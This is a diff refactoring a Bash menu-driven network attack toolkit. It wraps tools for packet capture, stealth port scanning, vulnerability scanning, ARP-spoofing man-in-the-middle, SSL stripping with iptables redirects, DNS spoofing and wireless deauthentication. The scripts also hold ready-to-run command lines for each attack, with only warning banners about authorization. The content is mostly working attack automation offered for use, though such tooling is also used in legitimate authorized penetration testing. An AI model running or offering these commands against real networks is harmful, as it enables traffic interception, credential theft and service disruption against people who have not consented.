+        return 1
+    fi
+    
+    CURRENT_INTERFACE="$MONITOR_INTERFACE"
+    echo -e "${GREEN}✓ Monitor interface: $MONITOR_INTERFACE${NC}"
+    log_event "Set monitor mode: $ORIGINAL_INTERFACE -> $MONITOR_INTERFACE"
 }
 
-# Network sniffing function with multiple tools
+# Network sniffing function
 network_sniff() {
     header
-    echo -e "${GREEN}Network Sniffing Options${NC}"
+    echo -e "${GREEN}═══ Network Sniffing Options ═══${NC}"
     echo "1. Basic packet capture (tcpdump)"
     echo "2. Advanced packet analysis (tshark)"
     echo "3. GUI packet analysis (Wireshark)"
     echo "4. Analyze captured data"
     echo "5. Return to main menu"
+    echo ""
     echo -e "${GREEN}Choose an option:${NC}"
     read -r option
     
     case $option in
         1)
             echo -e "${YELLOW}Packet capture with tcpdump${NC}"
-            check_tool "tcpdump" "tcpdump"
-            if [ $? -eq 1 ]; then return; fi
+            check_tool "tcpdump" "tcpdump" || return
             
-            get_interface
-            local output_file="$SESSION_DIR/captures/capture_$(date +%Y%m%d_%H%M%S)"
-            echo -e "${YELLOW}Running: sudo tcpdump -i $CURRENT_INTERFACE -w $output_file.pcap${NC}"
-            log_command "sudo tcpdump -i $CURRENT_INTERFACE -w $output_file.pcap"
-            sudo tcpdump -i $CURRENT_INTERFACE -w $output_file.pcap
+            get_interface || return
+            
+            local output_file
+            output_file="$SESSION_DIR/captures/capture_$(date +%Y%m%d_%H%M%S).pcap"
+            
+            echo -e "${GREEN}Enter capture duration in seconds (0 for manual stop):${NC}"
+            read -r duration
+            
+            if [ "$duration" = "0" ] || [ -z "$duration" ]; then
+                echo -e "${YELLOW}Starting capture. Press Ctrl+C to stop.${NC}"
+                echo -e "${YELLOW}Command: sudo tcpdump -i $CURRENT_INTERFACE -w $output_file${NC}"
+                log_command "sudo tcpdump -i $CURRENT_INTERFACE -w $output_file"
+                sudo tcpdump -i "$CURRENT_INTERFACE" -w "$output_file"
+            else
+                echo -e "${YELLOW}Capturing for $duration seconds...${NC}"
+                echo -e "${YELLOW}Command: sudo timeout $duration tcpdump -i $CURRENT_INTERFACE -w $output_file${NC}"
+                log_command "sudo timeout $duration tcpdump -i $CURRENT_INTERFACE -w $output_file"
+                sudo timeout "$duration" tcpdump -i "$CURRENT_INTERFACE" -w "$output_file"
+            fi
+            
+            echo -e "${GREEN}✓ Capture saved to: $output_file${NC}"
             ;;
         2)
             echo -e "${YELLOW}Packet analysis with tshark${NC}"
-            check_tool "tshark" "tshark"
-            if [ $? -eq 1 ]; then return; fi
+            check_tool "tshark" "tshark" || return
             
-            get_interface
-            echo -e "${GREEN}Enter filter (e.g., 'tcp port 80'):${NC}"
+            get_interface || return
+            
+            echo -e "${GREEN}Enter display filter (e.g., 'tcp.port==80' or leave empty):${NC}"
             read -r filter
-            local output_file="$SESSION_DIR/captures/capture_$(date +%Y%m%d_%H%M%S)"
-            echo -e "${YELLOW}Running: sudo tshark -i $CURRENT_INTERFACE -f '$filter' -w $output_file.pcap${NC}"
-            log_command "sudo tshark -i $CURRENT_INTERFACE -f '$filter' -w $output_file.pcap"
-            sudo tshark -i $CURRENT_INTERFACE -f "$filter" -w $output_file.pcap
+            
+            local output_file
+            output_file="$SESSION_DIR/captures/capture_$(date +%Y%m%d_%H%M%S).pcap"
+            
+            if [ -z "$filter" ]; then
+                echo -e "${YELLOW}Running: sudo tshark -i $CURRENT_INTERFACE -w $output_file${NC}"
+                log_command "sudo tshark -i $CURRENT_INTERFACE -w $output_file"
+                sudo tshark -i "$CURRENT_INTERFACE" -w "$output_file"
+            else
+                echo -e "${YELLOW}Running: sudo tshark -i $CURRENT_INTERFACE -f '$filter' -w $output_file${NC}"
+                log_command "sudo tshark -i $CURRENT_INTERFACE -f '$filter' -w $output_file"
+                sudo tshark -i "$CURRENT_INTERFACE" -f "$filter" -w "$output_file"
+            fi
             ;;
         3)
             echo -e "${YELLOW}GUI packet analysis with Wireshark${NC}"
-            check_tool "wireshark" "wireshark"
+            check_tool "wireshark" "wireshark" || return
             echo -e "${YELLOW}Starting Wireshark GUI...${NC}"
-            wireshark
+            wireshark &
             ;;
         4)
             echo -e "${YELLOW}Analyze captured data${NC}"
-            check_tool "tshark" "tshark"
+            check_tool "tshark" "tshark" || return
+            
+            echo -e "${GREEN}Available capture files:${NC}"
+            ls -1 "$SESSION_DIR/captures/"*.pcap 2>/dev/null | nl || echo "No captures found"
+            echo ""
             echo -e "${GREEN}Enter capture file path:${NC}"
             read -r cap_file
-            echo -e "${GREEN}Enter filter (e.g., 'http.request'):${NC}"
+            
+            if [ ! -f "$cap_file" ]; then
+                echo -e "${RED}File not found: $cap_file${NC}"
+                return
+            fi
+            
+            echo -e "${GREEN}Enter display filter (e.g., 'http.request' or leave empty for all):${NC}"
             read -r filter
-            echo -e "${YELLOW}Running: tshark -r $cap_file -Y '$filter'${NC}"
-            log_command "tshark -r $cap_file -Y '$filter'"
-            tshark -r $cap_file -Y "$filter"
+            
+            if [ -z "$filter" ]; then
+                echo -e "${YELLOW}Running: tshark -r $cap_file${NC}"
+                log_command "tshark -r $cap_file"
+                tshark -r "$cap_file" | less
+            else
+                echo -e "${YELLOW}Running: tshark -r $cap_file -Y '$filter'${NC}"
+                log_command "tshark -r $cap_file -Y '$filter'"
+                tshark -r "$cap_file" -Y "$filter" | less
+            fi
             ;;
         5)
             return
@@ -374,206 +686,244 @@ network_sniff() {
             ;;
     esac
     
+    echo ""
     echo -e "${GREEN}Press any key to continue...${NC}"
     read -n 1 -s
 }
 
-# Port scanning function with multiple tools
+# Port scanning function
 port_scan() {
     header
-    echo -e "${GREEN}Port Scanning Options${NC}"
-    echo "1. Quick scan (nmap)"
-    echo "2. Comprehensive scan (nmap)"
-    echo "3. Stealth scan (nmap)"
-    echo "4. Version detection (nmap)"
-    echo "5. Masscan (fast scanning)"
-    echo "6. Return to main menu"
+    echo -e "${GREEN}═══ Port Scanning Options ═══${NC}"
+    echo "1. Quick scan (Top 100 ports)"
+    echo "2. Comprehensive scan (All ports + version detection)"
+    echo "3. Stealth scan (SYN scan, slow timing)"
+    echo "4. UDP scan"
+    echo "5. OS detection"
+    echo "6. Fast scan (masscan)"
+    echo "7. Return to main menu"
+    echo ""
     echo -e "${GREEN}Choose an option:${NC}"
     read -r option
     
-    if [ -z "$CURRENT_TARGET" ]; then
-        get_target
+    if [ -z "${CURRENT_TARGET:-}" ]; then
+        get_target || return
     fi
     
-    local scan_file="$SESSION_DIR/scans/scan_$(date +%Y%m%d_%H%M%S).txt"
+    check_tool "nmap" "nmap" || return
+    
+    local scan_file
+    scan_file="$SESSION_DIR/scans/scan_$(date +%Y%m%d_%H%M%S).txt"
     
     case $option in
         1)
-            echo -e "${YELLOW}Quick scan with nmap${NC}"
-            check_tool "nmap" "nmap"
-            echo -e "${YELLOW}Running: nmap -F $CURRENT_TARGET${NC}"
-            log_command "nmap -F $CURRENT_TARGET"
-            nmap -F $CURRENT_TARGET | tee $scan_file
+            echo -e "${YELLOW}Quick scan (top 100 ports)${NC}"
+            echo -e "${YELLOW}Running: nmap -F -T4 $CURRENT_TARGET${NC}"
+            log_command "nmap -F -T4 $CURRENT_TARGET"
+            nmap -F -T4 "$CURRENT_TARGET" | tee "$scan_file"
             ;;
         2)
-            echo -e "${YELLOW}Comprehensive scan with nmap${NC}"
-            check_tool "nmap" "nmap"
-            echo -e "${YELLOW}Running: nmap -sS -sV -sC -O -p $ports $CURRENT_TARGET${NC}"
-            log_command "nmap -sS -sV -sC -O -p $ports $CURRENT_TARGET"
-            nmap -sS -sV -sC -O -p $ports $CURRENT_TARGET | tee $scan_file
+            echo -e "${YELLOW}Comprehensive scan${NC}"
+            echo -e "${YELLOW}Running: nmap -sS -sV -sC -O -p- -T4 $CURRENT_TARGET${NC}"
+            echo -e "${YELLOW}This may take a while...${NC}"
+            log_command "nmap -sS -sV -sC -O -p- -T4 $CURRENT_TARGET"
+            sudo nmap -sS -sV -sC -O -p- -T4 "$CURRENT_TARGET" | tee "$scan_file"
             ;;
         3)
-            echo -e "${YELLOW}Stealth scan with nmap${NC}"
-            check_tool "nmap" "nmap"
-            echo -e "${YELLOW}Running: nmap -sS -T2 -f $CURRENT_TARGET${NC}"
-            log_command "nmap -sS -T2 -f $CURRENT_TARGET"
-            nmap -sS -T2 -f $CURRENT_TARGET | tee $scan_file
+            echo -e "${YELLOW}Stealth scan${NC}"
+            echo -e "${YELLOW}Running: nmap -sS -T2 -f --data-length 24 $CURRENT_TARGET${NC}"
+            log_command "nmap -sS -T2 -f --data-length 24 $CURRENT_TARGET"
+            sudo nmap -sS -T2 -f --data-length 24 "$CURRENT_TARGET" | tee "$scan_file"
             ;;
         4)
-            echo -e "${YELLOW}Version detection with nmap${NC}"
-            check_tool "nmap" "nmap"
-            echo -e "${YELLOW}Running: nmap -sV -sC $CURRENT_TARGET${NC}"
-            log_command "nmap -sV -sC $CURRENT_TARGET"
-            nmap -sV -sC $CURRENT_TARGET | tee $scan_file
+            echo -e "${YELLOW}UDP scan${NC}"
+            echo -e "${YELLOW}Running: nmap -sU -F $CURRENT_TARGET${NC}"
+            log_command "nmap -sU -F $CURRENT_TARGET"
+            sudo nmap -sU -F "$CURRENT_TARGET" | tee "$scan_file"
             ;;
         5)
-            echo -e "${YELLOW}Fast scanning with masscan${NC}"
-            check_tool "masscan" "masscan"
-            echo -e "${GREEN}Enter rate (packets/second, default: 1000):${NC}"
-            read -r rate
-            if [[ -z "$rate" ]]; then
-                rate=1000
-            fi
-            echo -e "${YELLOW}Running: masscan -p$ports --rate=$rate $CURRENT_TARGET${NC}"
-            log_command "masscan -p$ports --rate=$rate $CURRENT_TARGET"
-            sudo masscan -p$ports --rate=$rate $CURRENT_TARGET | tee $scan_file
+            echo -e "${YELLOW}OS detection${NC}"
+            echo -e "${YELLOW}Running: nmap -O --osscan-guess $CURRENT_TARGET${NC}"
+            log_command "nmap -O --osscan-guess $CURRENT_TARGET"
+            sudo nmap -O --osscan-guess "$CURRENT_TARGET" | tee "$scan_file"
             ;;
         6)
+            echo -e "${YELLOW}Fast scanning with masscan${NC}"
+            check_tool "masscan" "masscan" || return
+            
+            echo -e "${GREEN}Enter rate (packets/second, default: 1000):${NC}"
+            read -r rate
+            rate=${rate:-1000}
+            
+            echo -e "${GREEN}Enter ports (default: 1-65535):${NC}"
+            read -r ports_range
+            ports_range=${ports_range:-1-65535}
+            
+            echo -e "${YELLOW}Running: sudo masscan -p$ports_range --rate=$rate $CURRENT_TARGET${NC}"
+            log_command "sudo masscan -p$ports_range --rate=$rate $CURRENT_TARGET"
+            sudo masscan -p"$ports_range" --rate="$rate" "$CURRENT_TARGET" | tee "$scan_file"
+            ;;
+        7)
             return
             ;;
         *)
             echo -e "${RED}Invalid option${NC}"
+            return
             ;;
     esac
     
-    echo -e "${GREEN}Scan results saved to: $scan_file${NC}"
+    echo ""
+    echo -e "${GREEN}✓ Scan results saved to: $scan_file${NC}"
     echo -e "${GREEN}Press any key to continue...${NC}"
     read -n 1 -s
 }
 
-# Vulnerability assessment function with multiple tools
+# Vulnerability assessment function
 vuln_assessment() {
     header
-    echo -e "${GREEN}Vulnerability Assessment Options${NC}"
-    echo "1. Basic vulnerability scan (nmap)"
+    echo -e "${GREEN}═══ Vulnerability Assessment Options ═══${NC}"
+    echo "1. Nmap vulnerability scan"
     echo "2. Web application scan (nikto)"
-    echo "3. Web application scan (OWASP ZAP)"
-    echo "4. Network service scan (nmap)"
+    echo "3. SSL/TLS scan"
+    echo "4. Safe scripts scan"
     echo "5. Return to main menu"
+    echo ""
     echo -e "${GREEN}Choose an option:${NC}"
     read -r option
     
-    if [ -z "$CURRENT_TARGET" ]; then
-        get_target
+    if [ -z "${CURRENT_TARGET:-}" ]; then
+        get_target || return
     fi
     
-    local vuln_file="$SESSION_DIR/scans/vuln_scan_$(date +%Y%m%d_%H%M%S).txt"
+    local vuln_file
+    vuln_file="$SESSION_DIR/scans/vuln_scan_$(date +%Y%m%d_%H%M%S).txt"
     
     case $option in
         1)
             echo -e "${YELLOW}Vulnerability scan with nmap${NC}"
-            check_tool "nmap" "nmap"
-            echo -e "${YELLOW}Running: nmap --script vuln $CURRENT_TARGET${NC}"
-            log_command "nmap --script vuln $CURRENT_TARGET"
-            nmap --script vuln $CURRENT_TARGET | tee $vuln_file
+            check_tool "nmap" "nmap" || return
+            echo -e "${YELLOW}Running: nmap --script vuln -sV $CURRENT_TARGET${NC}"
+            echo -e "${YELLOW}This may take several minutes...${NC}"
+            log_command "nmap --script vuln -sV $CURRENT_TARGET"
+            sudo nmap --script vuln -sV "$CURRENT_TARGET" | tee "$vuln_file"
             ;;
         2)
             echo -e "${YELLOW}Web application scan with nikto${NC}"
-            check_tool "nikto" "nikto"
-            echo -e "${GREEN}Enter URL (e.g., http://$CURRENT_TARGET):${NC}"
+            check_tool "nikto" "nikto" || return
+            echo -e "${GREEN}Enter URL (e.g., http://$CURRENT_TARGET or https://$CURRENT_TARGET):${NC}"
             read -r url
+            
+            if [ -z "$url" ]; then
+                echo -e "${RED}No URL specified${NC}"
+                return
+            fi
+            
             echo -e "${YELLOW}Running: nikto -h $url${NC}"
             log_command "nikto -h $url"
-            nikto -h $url | tee $vuln_file
+            nikto -h "$url" | tee "$vuln_file"
             ;;
         3)
-            echo -e "${YELLOW}Web application scan with OWASP ZAP${NC}"
-            check_tool "zap-cli" "zap-cli"
-            echo -e "${GREEN}Enter URL (e.g., http://$CURRENT_TARGET):${NC}"
-            read -r url
-            echo -e "${YELLOW}Running: zap-cli quick-scan $url${NC}"
-            log_command "zap-cli quick-scan $url"
-            zap-cli quick-scan $url | tee $vuln_file
+            echo -e "${YELLOW}SSL/TLS security scan${NC}"
+            check_tool "nmap" "nmap" || return
+            echo -e "${YELLOW}Running: nmap --script ssl-enum-ciphers -p 443 $CURRENT_TARGET${NC}"
+            log_command "nmap --script ssl-enum-ciphers -p 443 $CURRENT_TARGET"
+            nmap --script ssl-enum-ciphers -p 443 "$CURRENT_TARGET" | tee "$vuln_file"
             ;;
         4)
-            echo -e "${YELLOW}Network service scan with nmap${NC}"
-            check_tool "nmap" "nmap"
-            echo -e "${YELLOW}Running: nmap -sS -sV --script safe $CURRENT_TARGET${NC}"
-            log_command "nmap -sS -sV --script safe $CURRENT_TARGET"
-            nmap -sS -sV --script safe $CURRENT_TARGET | tee $vuln_file
+            echo -e "${YELLOW}Safe scripts scan with nmap${NC}"
+            check_tool "nmap" "nmap" || return
+            echo -e "${YELLOW}Running: nmap -sV --script safe $CURRENT_TARGET${NC}"
+            log_command "nmap -sV --script safe $CURRENT_TARGET"
+            nmap -sV --script safe "$CURRENT_TARGET" | tee "$vuln_file"
             ;;
         5)
             return
             ;;
         *)
             echo -e "${RED}Invalid option${NC}"
+            return
             ;;
     esac
     
-    echo -e "${GREEN}Vulnerability scan results saved to: $vuln_file${NC}"
+    echo ""
+    echo -e "${GREEN}✓ Vulnerability scan results saved to: $vuln_file${NC}"
     echo -e "${GREEN}Press any key to continue...${NC}"
     read -n 1 -s
 }
 
-# MITM Attack function with multiple tools :cite[1]:cite[7]
+# MITM Attack function
 mitm_attack() {
     header
-    echo -e "${GREEN}MITM Attack Options${NC}"
+    echo -e "${GREEN}═══ MITM Attack Options ═══${NC}"
+    echo -e "${RED}⚠️  WARNING: MITM attacks can disrupt network services${NC}"
+    echo -e "${RED}⚠️  Use only with explicit authorization${NC}"
+    echo ""
     echo "1. ARP Spoofing (arpspoof)"
     echo "2. Bettercap (comprehensive MITM)"
     echo "3. Ettercap (GUI and CLI options)"
     echo "4. SSL Stripping (sslstrip)"
-    echo "5. DHCP Spoofing"
-    echo "6. Return to main menu"
+    echo "5. Return to main menu"
+    echo ""
     echo -e "${GREEN}Choose an option:${NC}"
     read -r option
     
     case $option in
         1)
             echo -e "${YELLOW}ARP Spoofing with arpspoof${NC}"
-            check_tool "arpspoof" "dsniff"
-            if [ $? -eq 1 ]; then return; fi
+            check_tool "arpspoof" "dsniff" || return
             
-            get_interface
+            get_interface || return
+            
             echo -e "${GREEN}Enter target IP:${NC}"
             read -r target_ip
             echo -e "${GREEN}Enter gateway IP:${NC}"
             read -r gateway_ip
             
+            if [ -z "$target_ip" ] || [ -z "$gateway_ip" ]; then
+                echo -e "${RED}Invalid input${NC}"
+                return
+            fi
+            
             echo -e "${YELLOW}Enabling IP forwarding...${NC}"
-            sudo sysctl -w net.ipv4.ip_forward=1
+            sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
             
             echo -e "${YELLOW}Starting ARP spoofing between $target_ip and $gateway_ip${NC}"
+            echo -e "${RED}Press Ctrl+C or any key to stop${NC}"
+            
             log_command "sudo arpspoof -i $CURRENT_INTERFACE -t $target_ip $gateway_ip"
-            sudo arpspoof -i $CURRENT_INTERFACE -t $target_ip $gateway_ip &
-            arpspoof_pid1=$!
+            sudo arpspoof -i "$CURRENT_INTERFACE" -t "$target_ip" "$gateway_ip" &
+            local arpspoof_pid1=$!
+            BACKGROUND_PIDS+=("$arpspoof_pid1")
             
             log_command "sudo arpspoof -i $CURRENT_INTERFACE -t $gateway_ip $target_ip"
-            sudo arpspoof -i $CURRENT_INTERFACE -t $gateway_ip $target_ip &
-            arpspoof_pid2=$!
+            sudo arpspoof -i "$CURRENT_INTERFACE" -t "$gateway_ip" "$target_ip" &
+            local arpspoof_pid2=$!
+            BACKGROUND_PIDS+=("$arpspoof_pid2")
             
-            echo -e "${GREEN}ARP spoofing running. Press any key to stop...${NC}"
             read -n 1 -s
-            sudo kill $arpspoof_pid1 $arpspoof_pid2 2>/dev/null
-            echo -e "${YELLOW}ARP spoofing stopped${NC}"
+            
+            kill "$arpspoof_pid1" "$arpspoof_pid2" 2>/dev/null || true
+            echo -e "${YELLOW}✓ ARP spoofing stopped${NC}"
             log_event "ARP spoofing stopped"
             ;;
         2)
             echo -e "${YELLOW}Comprehensive MITM with Bettercap${NC}"
-            check_tool "bettercap" "bettercap"
-            if [ $? -eq 1 ]; then return; fi
+            check_tool "bettercap" "bettercap" || return
             
-            get_interface
+            get_interface || return
+            
             echo -e "${YELLOW}Starting Bettercap on interface $CURRENT_INTERFACE${NC}"
+            echo -e "${CYAN}Tip: Use 'net.probe on' and 'net.recon on' to discover hosts${NC}"
+            echo -e "${CYAN}Use 'arp.spoof on' to start ARP spoofing${NC}"
             log_command "sudo bettercap -iface $CURRENT_INTERFACE"
-            sudo bettercap -iface $CURRENT_INTERFACE
+            sudo bettercap -iface "$CURRENT_INTERFACE"
             ;;
         3)
             echo -e "${YELLOW}MITM with Ettercap${NC}"
-            check_tool "ettercap" "ettercap-graphical"
-            if [ $? -eq 1 ]; then return; fi
+            check_tool "ettercap" "ettercap-graphical" || return
             
-            get_interface
+            get_interface || return
+            
             echo -e "${GREEN}Choose Ettercap mode:${NC}"
             echo "1. Text mode"
             echo "2. Graphical mode"
@@ -583,639 +933,222 @@ mitm_attack() {
             case $ettercap_mode in
                 1)
                     log_command "sudo ettercap -T -i $CURRENT_INTERFACE"
-                    sudo ettercap -T -i $CURRENT_INTERFACE
+                    sudo ettercap -T -i "$CURRENT_INTERFACE"
                     ;;
                 2)
                     log_command "sudo ettercap -G -i $CURRENT_INTERFACE"
-                    sudo ettercap -G -i $CURRENT_INTERFACE
+                    sudo ettercap -G -i "$CURRENT_INTERFACE" &
                     ;;
                 3)
                     log_command "sudo ettercap -C -i $CURRENT_INTERFACE"
-                    sudo ettercap -C -i $CURRENT_INTERFACE
+                    sudo ettercap -C -i "$CURRENT_INTERFACE"
                     ;;
                 *)
                     echo -e "${RED}Invalid option${NC}"
+                    return
                     ;;
             esac
             ;;
         4)
             echo -e "${YELLOW}SSL Stripping with sslstrip${NC}"
-            check_tool "sslstrip" "sslstrip"
-            if [ $? -eq 1 ]; then return; fi
+            check_tool "sslstrip" "sslstrip" || return
             
-            get_interface
-            echo -e "${GREEN}Enter port to redirect (default: 8080):${NC}"
+            get_interface || return
+            
+            echo -e "${GREEN}Enter port to listen on (default: 8080):${NC}"
             read -r sslstrip_port
-            if [[ -z "$sslstrip_port" ]]; then
-                sslstrip_port=8080
-            fi
+            sslstrip_port=${sslstrip_port:-8080}
             
             echo -e "${YELLOW}Setting up iptables rules...${NC}"
-            sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port $sslstrip_port
+            sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port "$sslstrip_port"
+            sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port "$sslstrip_port"
+            
+            local logfile
+            logfile="$SESSION_DIR/captures/sslstrip_$(date +%Y%m%d_%H%M%S).log"
             
             echo -e "${YELLOW}Starting sslstrip on port $sslstrip_port${NC}"
-            log_command "sudo sslstrip -l $sslstrip_port -w $SESSION_DIR/captures/sslstrip_log.txt"
-            sudo sslstrip -l $sslstrip_port -w $SESSION_DIR/captures/sslstrip_log.txt &
-            sslstrip_pid=$!
+            echo -e "${RED}Press any key to stop${NC}"
+            log_command "sudo sslstrip -l $sslstrip_port -w $logfile"
+            sudo sslstrip -l "$sslstrip_port" -w "$logfile" &
+            local sslstrip_pid=$!
+            BACKGROUND_PIDS+=("$sslstrip_pid")
             
-            echo -e "${GREEN}SSL stripping running. Press any key to stop...${NC}"
             read -n 1 -s
-            sudo kill $sslstrip_pid 2>/dev/null
-            sudo iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port $sslstrip_port
-            echo -e "${YELLOW}SSL stripping stopped${NC}"
+            
+            kill "$sslstrip_pid" 2>/dev/null || true
+            sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port "$sslstrip_port" 2>/dev/null || true
+            sudo iptables -t nat -D PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port "$sslstrip_port" 2>/dev/null || true
+            
+            echo -e "${YELLOW}✓ SSL stripping stopped${NC}"
+            echo -e "${GREEN}Log saved to: $logfile${NC}"
             log_event "SSL stripping stopped"
             ;;
         5)
-            echo -e "${YELLOW}DHCP Spoofing${NC}"
-            check_tool "dhcpspoof" "yersinia"
-            if [ $? -eq 1 ]; then return; fi
-            
-            get_interface
-            echo -e "${YELLOW}Starting DHCP spoofing on interface $CURRENT_INTERFACE${NC}"
-            log_command "sudo yersinia -G -I $CURRENT_INTERFACE"
-            sudo yersinia -G -I $CURRENT_INTERFACE
-            ;;
-        6)
             return
             ;;
         *)
             echo -e "${RED}Invalid option${NC}"
+            return
             ;;
     esac
     
+    echo ""
     echo -e "${GREEN}Press any key to continue...${NC}"
     read -n 1 -s
 }
 
-# DNS Spoofing function with multiple tools :cite[7]:cite[10]
+# DNS Spoofing function
 dns_spoof() {
     header
-    echo -e "${GREEN}DNS Spoofing Options${NC}"
+    echo -e "${GREEN}═══ DNS Spoofing Options ═══${NC}"
+    echo -e "${RED}⚠️  WARNING: DNS spoofing can redirect legitimate traffic${NC}"
+    echo -e "${RED}⚠️  Use only with explicit authorization${NC}"
+    echo ""
     echo "1. DNSchef (Python-based)"
     echo "2. Ettercap DNS spoofing"
     echo "3. Return to main menu"
+    echo ""
     echo -e "${GREEN}Choose an option:${NC}"
     read -r option
     
     case $option in
         1)
             echo -e "${YELLOW}DNS Spoofing with DNSchef${NC}"
-            check_tool "dnschef" "dnschef"
-            if [ $? -eq 1 ]; then return; fi
             
-            get_interface
+            if ! command -v dnschef &> /dev/null && ! command -v dnschef.py &> /dev/null; then
+                echo -e "${RED}DNSchef not found${NC}"
+                echo -e "${YELLOW}Install from: https://github.com/iphelix/dnschef${NC}"
+                return
+            fi
+            
+            get_interface || return
+            
             echo -e "${GREEN}Enter IP address to redirect requests to:${NC}"
             read -r redirect_ip
+            
+            if [ -z "$redirect_ip" ]; then
+                echo -e "${RED}No IP specified${NC}"
+                return
+            fi
+            
             echo -e "${GREEN}Enter domain to spoof (leave empty for all domains):${NC}"
             read -r spoof_domain
             
-            local_ip=$(ip addr show $CURRENT_INTERFACE 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+            local local_ip
+            local_ip=$(ip addr show "$CURRENT_INTERFACE" 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
             
-            if [[ -z "$spoof_domain" ]]; then
-                echo -e "${YELLOW}Redirecting all domains to $redirect_ip${NC}"
-                log_command "sudo dnschef -i $redirect_ip --interface $local_ip"
-                sudo dnschef -i $redirect_ip --interface $local_ip &
-            else
-                echo -e "${YELLOW}Redirecting $spoof_domain to $redirect_ip${NC}"
-                log_command "sudo dnschef --fakedomains=$spoof_domain=$redirect_ip --interface $local_ip"
-                sudo dnschef --fakedomains=$spoof_domain=$redirect_ip --interface $local_ip &
+            if [ -z "$local_ip" ]; then
+                echo -e "${RED}Could not determine interface IP${NC}"
+                return
             fi
             
-            dnschef_pid=$!
+            echo -e "${RED}Press Ctrl+C or any key to stop${NC}"
             
-            echo -e "${GREEN}DNS spoofing running. Press any key to stop...${NC}"
+            if [ -z "$spoof_domain" ]; then
+                echo -e "${YELLOW}Redirecting all domains to $redirect_ip${NC}"
+                log_command "dnschef -i $local_ip --fakeip=$redirect_ip"
+                sudo dnschef -i "$local_ip" --fakeip="$redirect_ip" &
+            else
+                echo -e "${YELLOW}Redirecting $spoof_domain to $redirect_ip${NC}"
+                log_command "dnschef -i $local_ip --fakedomains=$spoof_domain=$redirect_ip"
+                sudo dnschef -i "$local_ip" --fakedomains="$spoof_domain=$redirect_ip" &
+            fi
+            
+            local dnschef_pid=$!
+            BACKGROUND_PIDS+=("$dnschef_pid")
+            
             read -n 1 -s
-            sudo kill $dnschef_pid 2>/dev/null
-            echo -e "${YELLOW}DNS spoofing stopped${NC}"
+            
+            kill "$dnschef_pid" 2>/dev/null || true
+            echo -e "${YELLOW}✓ DNS spoofing stopped${NC}"
             log_event "DNS spoofing stopped"
             ;;
         2)
             echo -e "${YELLOW}DNS Spoofing with Ettercap${NC}"
-            check_tool "ettercap" "ettercap-graphical"
-            if [ $? -eq 1 ]; then return; fi
+            check_tool "ettercap" "ettercap-graphical" || return
             
-            echo -e "${YELLOW}Create a DNS spoof configuration file first${NC}"
             echo -e "${GREEN}Enter domain to spoof:${NC}"
             read -r spoof_domain
             echo -e "${GREEN}Enter IP address to redirect to:${NC}"
             read -r redirect_ip
             
-            echo "$spoof_domain A $redirect_ip" > $SESSION_DIR/etter.dns
-            echo -e "${YELLOW}Created etter.dns file with spoofing rule${NC}"
+            if [ -z "$spoof_domain" ] || [ -z "$redirect_ip" ]; then
+                echo -e "${RED}Invalid input${NC}"
+                return
+            fi
             
-            get_interface
+            local dns_file
+            dns_file="$SESSION_DIR/etter_$(date +%Y%m%d_%H%M%S).dns"
+            echo "$spoof_domain A $redirect_ip" > "$dns_file"
+            echo -e "${GREEN}✓ Created DNS spoofing configuration${NC}"
+            
+            get_interface || return
+            
             echo -e "${YELLOW}Starting Ettercap for DNS spoofing${NC}"
-            log_command "sudo ettercap -T -i $CURRENT_INTERFACE -P dns_spoof -f $SESSION_DIR/etter.dns // //"
-            sudo ettercap -T -i $CURRENT_INTERFACE -P dns_spoof -f $SESSION_DIR/etter.dns // //
+            log_command "sudo ettercap -T -i $CURRENT_INTERFACE -P dns_spoof -M arp:remote // //"
+            sudo ettercap -T -i "$CURRENT_INTERFACE" -P dns_spoof -M arp:remote // //
             ;;
         3)
             return
             ;;
         *)
             echo -e "${RED}Invalid option${NC}"
+            return
             ;;
     esac
     
+    echo ""
     echo -e "${GREEN}Press any key to continue...${NC}"
     read -n 1 -s
 }
 
-# Wireless client kicking function with multiple tools
-wireless_kick() {
+# Wireless attacks function
+wireless_attacks() {
     header
-    echo -e "${GREEN}Wireless Attack Options${NC}"
-    echo "1. Deauthentication attack (aireplay-ng)"
-    echo "2. MDK4 deauthentication"
+    echo -e "${GREEN}═══ Wireless Attack Options ═══${NC}"
+    echo -e "${RED}⚠️  WARNING: Wireless attacks can cause service disruption${NC}"
+    echo -e "${RED}⚠️  Use only on networks you own or have authorization to test${NC}"
+    echo ""
+    echo "1. Scan for networks"
+    echo "2. Deauthentication attack (aireplay-ng)"
     echo "3. WPA/WPA2 handshake capture"
     echo "4. WPS attack (reaver)"
-    echo "5. Return to main menu"
-    echo -e "${GREEN}Choose an option:${NC}"
-    read -r option
-    
-    case $option in
-        1)
-            echo -e "${YELLOW}Deauthentication attack with aireplay-ng${NC}"
-            check_tool "aireplay-ng" "aircrack-ng"
-            if [ $? -eq 1 ]; then return; fi
-            
-            get_monitor_interface
-            echo -e "${GREEN}Enter target BSSID:${NC}"
-            read -r bssid
-            echo -e "${GREEN}Enter target client MAC (leave empty for all clients):${NC}"
-            read -r client_mac
-            echo -e "${GREEN}Enter number of deauth packets to send (0 for continuous):${NC}"
-            read -r deauth_count
-            
-            if [[ -z "$deauth_count" || $deauth_count -eq 0 ]]; then
-                deauth_count=0
-            fi
-            
-            if [[ -z "$client_mac" ]]; then
-                echo -e "${YELLOW}Running: sudo aireplay-ng --deauth $deauth_count -a $bssid $CURRENT_INTERFACE${NC}"
-                log_command "sudo aireplay-ng --deauth $deauth_count -a $bssid $CURRENT_INTERFACE"
-                sudo aireplay-ng --deauth $deauth_count -a $bssid $CURRENT_INTERFACE
-            else
-                echo -e "${YELLOW}Running: sudo aireplay-ng --deauth $deauth_count -a $bssid -c $client_mac $CURRENT_INTERFACE${NC}"
-                log_command "sudo aireplay-ng --deauth $deauth_count -a $bssid -c $client_mac $CURRENT_INTERFACE"
-                sudo aireplay-ng --deauth $deauth_count -a $bssid -c $client_mac $CURRENT_INTERFACE
-            fi
-            ;;
-        2)
-            echo -e "${YELLOW}Deauthentication attack with MDK4${NC}"
-            check_tool "mdk4" "mdk4"
